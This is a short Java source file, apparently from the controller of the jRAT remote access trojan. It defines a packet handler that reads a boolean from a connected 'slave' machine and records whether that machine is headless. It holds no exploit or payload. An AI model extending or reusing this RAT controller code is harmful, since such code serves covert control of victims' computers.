package jrat.controller.packets.incoming;

import jrat.controller.Slave;

public class Packet20Headless implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		boolean headless = slave.readBoolean();

		slave.setHeadless(headless);
	}
}
